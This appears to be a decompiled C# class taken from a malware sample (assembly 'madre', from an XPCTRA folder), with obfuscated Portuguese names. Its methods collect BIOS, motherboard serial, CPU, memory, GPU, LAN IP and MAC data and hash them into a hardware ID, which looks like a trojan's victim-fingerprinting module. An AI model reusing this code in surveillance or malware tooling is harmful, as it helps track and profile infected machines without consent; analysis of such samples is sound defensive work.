// Decompiled with JetBrains decompiler
// Type: VERMELHO265MONARCA.Core.Helper.SOCIAIS684DESCALABRO
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using VERMELHO265MONARCA.Core.Cryptography;

namespace VERMELHO265MONARCA.Core.Helper
{
  public static class SOCIAIS684DESCALABRO
  {
    public static string HardwareId { get; private set; }

    static SOCIAIS684DESCALABRO()
    {
      SOCIAIS684DESCALABRO.HardwareId = SHA256.ComputeHash(SOCIAIS684DESCALABRO.MANTER555REVISTAR() + SOCIAIS684DESCALABRO.OPRIMIDO608RUGBI() + SOCIAIS684DESCALABRO.GetBiosIdentifier());
    }

    public static string GetBiosIdentifier()
    {
      try
      {
        string empty = string.Empty;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
          {
            if (enumerator.MoveNext())
              empty = enumerator.Current["Manufacturer"].ToString();
          }
        }
        return !string.IsNullOrEmpty(empty) ? empty : "N/A";
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string OPRIMIDO608RUGBI()
    {
      try
      {
        string str = string.Empty;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard"))
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
          {
            if (enumerator.MoveNext())
            {
              ManagementObject current = (ManagementObject) enumerator.Current;
              str = current["Manufacturer"].ToString() + current["SerialNumber"].ToString();
            }
          }
        }
        return !string.IsNullOrEmpty(str) ? str : "N/A";
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string MANTER555REVISTAR()
    {
      try
      {
        string input = string.Empty;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
        {
          foreach (ManagementObject managementObject in managementObjectSearcher.Get())
            input = input + managementObject["Name"].ToString() + "; ";
        }
        string str = DEFEITUOSO43DESORDEM.RemoveEnd(input);
        return !string.IsNullOrEmpty(str) ? str : "N/A";
      }
      catch
      {
      }
      return "Unknown";
    }

    public static int INVIOLABILIDADE824FORMULACAO()
    {
      try
      {
        int num = 0;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
          {
            if (enumerator.MoveNext())
              num = (int) (Convert.ToDouble(enumerator.Current["TotalPhysicalMemory"]) / 1048576.0);
          }
        }
        return num;
      }
      catch
      {
        return -1;
      }
    }

    public static string GetGpuName()
    {
      try
      {
        string input = string.Empty;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration"))
        {
          foreach (ManagementObject managementObject in managementObjectSearcher.Get())
            input = input + managementObject["Description"].ToString() + "; ";
        }
        string str = DEFEITUOSO43DESORDEM.RemoveEnd(input);
        return !string.IsNullOrEmpty(str) ? str : "N/A";
      }
      catch
      {
        return "Unknown";
      }
    }

    public static string GetLanIp()
    {
      foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
      {
        if (networkInterface.GetIPProperties().GatewayAddresses.FirstOrDefault<GatewayIPAddressInformation>() != null && (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet && networkInterface.OperationalStatus == OperationalStatus.Up))
        {
          foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
          {
            if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && unicastAddress.AddressPreferredLifetime != (long) uint.MaxValue)
              return unicastAddress.Address.ToString();
          }
        }
      }
      return "-";
    }

    public static string GetMacAddress()
    {
      foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
      {
        if (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet && networkInterface.OperationalStatus == OperationalStatus.Up)
        {
          bool flag = false;
          foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
          {
            if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && unicastAddress.AddressPreferredLifetime != (long) uint.MaxValue)
              flag = unicastAddress.Address.ToString() == SOCIAIS684DESCALABRO.GetLanIp();
          }
          if (flag)
            return DEFEITUOSO43DESORDEM.FormatMacAddress(networkInterface.GetPhysicalAddress().ToString());
        }
      }
      return "-";
    }
  }
}
